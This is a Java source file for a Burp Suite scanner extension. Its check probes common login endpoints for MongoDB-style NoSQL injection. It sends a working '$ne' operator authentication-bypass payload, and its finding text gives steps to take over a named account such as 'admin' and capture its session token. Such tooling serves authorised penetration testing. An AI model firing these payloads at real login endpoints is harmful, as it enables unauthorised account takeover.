package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.VulnCheck;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * Tests authentication bypass via NoSQL operators (MongoDB-style, e.g. $ne,
 * $gt) on login endpoints: compares the response of a clearly invalid login
 * (baseline) with the response using injection operators — if the behavior
 * changes from "denied" to "success", that's a strong sign of NoSQL Injection.
 *
 * Created by Rx0 - @rodrigocoutinho91
 */
public class NoSqlInjectionCheck implements VulnCheck {

    private static final String[] PATHS = {"/api/login", "/api/v1/login", "/api/auth/login", "/login"};

    private static final String NONEXISTENT_USER = "rx0_user_that_does_not_exist_" + System.currentTimeMillis();

    private static final Pattern[] SUCCESS_SIGNATURES = {
            Pattern.compile("\"(token|access_token|jwt|session)\"\\s*:\\s*\"[^\"]{10,}", Pattern.CASE_INSENSITIVE),
            Pattern.compile("\"success\"\\s*:\\s*true", Pattern.CASE_INSENSITIVE),
            Pattern.compile("\"authenticated\"\\s*:\\s*true", Pattern.CASE_INSENSITIVE),
            Pattern.compile("\"(loggedIn|logged_in)\"\\s*:\\s*true", Pattern.CASE_INSENSITIVE),
    };

    @Override
    public String name() {
        return "NoSQL Injection (MongoDB-style authentication bypass)";
    }

    @Override
    public List<Finding> execute(MontoyaApi api, String baseUrl) {
        List<Finding> findings = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        for (String path : PATHS) {
            try {
                String url = base + path;

                // 1) Baseline: clearly invalid login with normal string values
                String baselineBody = "{\"username\":\"" + NONEXISTENT_USER + "\",\"password\":\"wrong_password_123\"}";
                HttpRequest baselineReq = HttpRequest.httpRequestFromUrl(url)
                        .withMethod("POST")
                        .withAddedHeader("Content-Type", "application/json")
                        .withBody(baselineBody);
                HttpResponse baselineResp = api.http().sendRequest(baselineReq).response();
                if (baselineResp == null) continue;
                boolean baselineLooksSuccessful = bodyIndicatesSuccess(baselineResp.bodyToString());
                if (baselineLooksSuccessful) continue; // this endpoint always "succeeds" — noisy signal, skip

                // 2) Injection payload: $ne operators make the query accept "any value other than null"
                String injectedBody = "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}";
                HttpRequest injectedReq = HttpRequest.httpRequestFromUrl(url)
                        .withMethod("POST")
                        .withAddedHeader("Content-Type", "application/json")
                        .withBody(injectedBody);
                HttpResponse injectedResp = api.http().sendRequest(injectedReq).response();
                if (injectedResp == null) continue;

                boolean injectedLooksSuccessful = bodyIndicatesSuccess(injectedResp.bodyToString())
                        || (injectedResp.statusCode() == 200 && baselineResp.statusCode() != 200);

                if (injectedLooksSuccessful) {
                    findings.add(new Finding(
                            "Possible NoSQL Injection (login bypass) at " + path,
                            Severity.CRITICAL,
                            url,
                            "A login with clearly invalid credentials was rejected (status " + baselineResp.statusCode() +
                                    "), but the same endpoint with NoSQL operators ($ne) in place of the values returned signs of " +
                                    "successful authentication (status " + injectedResp.statusCode() + "). This suggests the query " +
                                    "to the NoSQL database is built directly from the user's JSON, with no sanitization.",
                            "Baseline: " + baselineBody + " -> " + baselineResp.statusCode() +
                                    " | Payload: " + injectedBody + " -> " + injectedResp.statusCode(),
                            "Never pass the user's JSON directly into the database query. Validate the type of each field " +
                                    "(reject objects where a string is expected) and use NoSQL-specific sanitization libraries (e.g. mongo-sanitize).",
                            "1) Resend the POST to " + url + " with the exact body: " + injectedBody + " — this is already a full bypass, " +
                                    "you're authenticated as the first user the query finds in the database. 2) To target a " +
                                    "specific account, use {\"username\":\"admin\",\"password\":{\"$ne\":null}} (exact username + bypassed password). " +
                                    "3) Capture the returned token/session as proof of account takeover."));
                }
            } catch (Exception e) {
                api.logging().logToError("[Rx0] Error in NoSQL Injection check (" + path + "): " + e.getMessage());
            }
        }
        return findings;
    }

    private boolean bodyIndicatesSuccess(String body) {
        if (body == null) return false;
        for (Pattern p : SUCCESS_SIGNATURES) {
            if (p.matcher(body).find()) return true;
        }
        return false;
    }
}
